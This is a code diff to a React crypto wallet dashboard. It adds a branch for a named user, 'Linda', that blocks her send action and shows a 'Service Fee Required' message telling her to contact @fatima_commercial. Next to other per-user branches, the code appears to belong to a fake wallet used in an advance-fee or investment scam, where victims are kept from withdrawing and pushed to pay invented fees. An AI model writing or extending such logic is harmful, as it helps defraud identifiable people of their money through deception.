@@ -298,6 +298,14 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
     } else if (isRami) {
       // For Rami, just close the dialog as the message is shown in the dialog content
       setIsSendDialogOpen(false);
+    } else if (isLinda) {
+      // For Linda, show message to contact @fatima_commercial for service fee
+      toast({
+        title: "Service Fee Required",
+        description: "Please contact @fatima_commercial to process a service fee for the wallet",
+        variant: "destructive",
+      });
+      setIsSendDialogOpen(false);
     } else {
       setIsSendDialogOpen(false);
       setIsOfacDialogOpen(true);
